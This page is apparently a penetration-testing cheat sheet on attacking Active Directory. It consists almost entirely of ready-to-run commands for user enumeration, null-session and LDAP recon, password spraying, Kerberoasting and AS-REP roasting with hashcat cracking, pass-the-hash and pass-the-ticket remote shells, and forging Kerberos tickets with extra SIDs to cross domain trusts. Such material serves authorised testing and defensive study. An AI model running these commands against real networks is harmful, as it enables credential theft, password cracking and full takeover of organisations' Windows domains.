+++
title = "Active Directory"
date = "2026-05-05T00:00:00-05:00"
tags = ["active-directory", "windows", "kerberos", "enumeration"]
description = "AD enumeration, credentialed recon, Kerberoasting, AS-REP Roasting, and BloodHound from Linux and Windows."
draft = false
+++

## Host & User Discovery (Unauthenticated)

```bash
# Identify hosts via ARP/ping sweep
sudo arp-scan -l
fping -asgq 172.16.5.0/23

# Kerbrute — username enumeration without credentials
kerbrute userenum -d DOMAIN.LOCAL --dc 172.16.5.5 /usr/share/wordlists/seclists/Usernames/jsmith.txt

# RID brute-force with null/guest session
netexec smb <dc-ip> -u guest -p '' --rid-brute
lookupsid.py DOMAIN/guest@<dc-ip> -no-pass | grep SidTypeUser | cut -d' ' -f2 | cut -d'\' -f2
```

---

## Enumerating Without Credentials

```bash
# SMB null session
rpcclient -U "" -N <dc-ip>
  enumdomusers
  queryuser <RID>
  enumdomgroups

# LDAP anonymous bind
ldapsearch -x -H ldap://<dc-ip> -b "DC=domain,DC=local"

# enum4linux
enum4linux -a <dc-ip>

# Password policy (no creds)
crackmapexec smb <dc-ip> --pass-pol
```

---

## Credentialed Enumeration — Linux

```bash
# CrackMapExec
crackmapexec smb <dc-ip> -u user -p pass --users
crackmapexec smb <dc-ip> -u user -p pass --groups
crackmapexec smb <dc-ip> -u user -p pass --loggedon-users
crackmapexec smb <dc-ip> -u user -p pass --shares
crackmapexec smb <dc-ip> -u user -p pass -M spider_plus --share 'Department Shares'

# Password spray (no bruteforce lockout)
crackmapexec smb <dc-ip> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

# SMBMap
smbmap -u user -p pass -d DOMAIN.LOCAL -H <dc-ip>
smbmap -u user -p pass -d DOMAIN.LOCAL -H <dc-ip> -R 'Share' --dir-only

# ldapdomaindump — dump everything to files
ldapdomaindump -u 'DOMAIN\user' -p 'pass' <dc-ip> -o ldap/

# Windapsearch
python3 windapsearch.py --dc-ip <dc-ip> -u user@domain.local -p pass --da   # Domain Admins
python3 windapsearch.py --dc-ip <dc-ip> -u user@domain.local -p pass -PU    # Privileged users

# BloodHound Python ingestor
bloodhound-python -u user -p 'pass' -ns <dc-ip> -d domain.local -c all
```

---

## Credentialed Enumeration — Windows

```powershell
# ActiveDirectory module
Import-Module ActiveDirectory
Get-ADDomain
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADGroup -Filter * | select name
Get-ADGroupMember -Identity "Domain Admins"
Get-ADTrust -Filter *

# PowerView
Import-Module .\PowerView.ps1
Get-DomainUser -Identity targetuser | Select-Object name,samaccountname,memberof,admincount,serviceprincipalname
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainTrustMapping
Test-AdminAccess -ComputerName TARGET-HOST
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

# SharpHound
.\SharpHound.exe -c All --zipfilename output
# Upload the zip to BloodHound GUI

# Snaffler — credential/config file hunting in shares
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```

---

## Kerberoasting

```bash
# Linux — list SPNs
impacket-GetUserSPNs -dc-ip <dc-ip> DOMAIN.LOCAL/user

# Request all TGS tickets
impacket-GetUserSPNs -dc-ip <dc-ip> DOMAIN.LOCAL/user -request

# Request single ticket
impacket-GetUserSPNs -dc-ip <dc-ip> DOMAIN.LOCAL/user -request-user sqldev -outputfile sqldev_tgs

# Crack with hashcat
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

```powershell
# Windows — PowerView
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation

# Windows — setspn + Mimikatz
setspn.exe -Q */*
# In Mimikatz: kerberos::list /export  → kirbi2john.py → hashcat -m 13100
```

---

## AS-REP Roasting

```bash
# Users with pre-auth disabled (no creds needed)
impacket-GetNPUsers DOMAIN.LOCAL/ -usersfile users.txt -dc-ip <dc-ip>

# With credentials — find all vulnerable accounts
impacket-GetNPUsers DOMAIN.LOCAL/user:pass -dc-ip <dc-ip> -request

# Crack
hashcat -m 18200 asrep_hashes /usr/share/wordlists/rockyou.txt
```

---

## Pass-the-Hash / Pass-the-Ticket

```bash
# PTH with crackmapexec
crackmapexec smb <target> -u Administrator -H <ntlm-hash>

# PTH shell via impacket
impacket-psexec Administrator@<target> -hashes :<ntlm-hash>
evil-winrm -u Administrator -H <ntlm-hash> -i <target>
impacket-wmiexec DOMAIN/user@<target> -hashes :<ntlm-hash>

# Pass-the-Ticket
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass DOMAIN/user@target
```

---

## Domain Trusts

```bash
# Enumerate trusts from Linux
impacket-GetADUsers -dc-ip <dc-ip> DOMAIN/user:pass -all

# BloodHound — query: "Map Domain Trusts"

# Exploit SID History / trust relationships
impacket-ticketer -nthash <krbtgt-hash> -domain-sid <SID> -domain DOMAIN.LOCAL -extra-sid <child-SID> -spn krbtgt/TRUSTED.DOMAIN Administrator
```

```powershell
# From Windows
Get-ADTrust -Filter *
Get-DomainTrustMapping   # PowerView
nltest /domain_trusts
```
